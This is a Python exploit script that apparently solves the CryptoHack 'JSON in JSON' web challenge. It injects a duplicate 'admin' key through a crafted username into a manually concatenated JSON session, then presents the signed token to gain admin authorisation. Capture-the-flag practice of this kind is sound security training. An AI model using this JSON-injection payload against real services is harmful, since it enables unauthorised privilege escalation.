#!/usr/bin/env python3

"""
JSON in JSON – Injection Exploit

Vulnerability:
The server constructs JSON manually via string concatenation.

We inject a second "admin" field into username.
Since json.loads() keeps the last duplicate key,
we override admin=False with admin=True.
"""

import requests

BASE_URL = "https://web.cryptohack.org/json-in-json"

# -------------------------------------------------
# Step 1: Craft malicious username
# -------------------------------------------------
malicious_username = '", "admin": "True'

print("[+] Using malicious username:")
print(malicious_username)
print()

# -------------------------------------------------
# Step 2: Request a signed session
# -------------------------------------------------
resp = requests.get(
    f"{BASE_URL}/create_session/{malicious_username}/"
)

token = resp.json()["session"]

print("[+] Received signed token:\n")
print(token)
print()

# -------------------------------------------------
# Step 3: Send token for authorisation
# -------------------------------------------------
auth = requests.get(
    f"{BASE_URL}/authorise/{token}/"
)

print("[+] Server Response:\n")
print(auth.json())
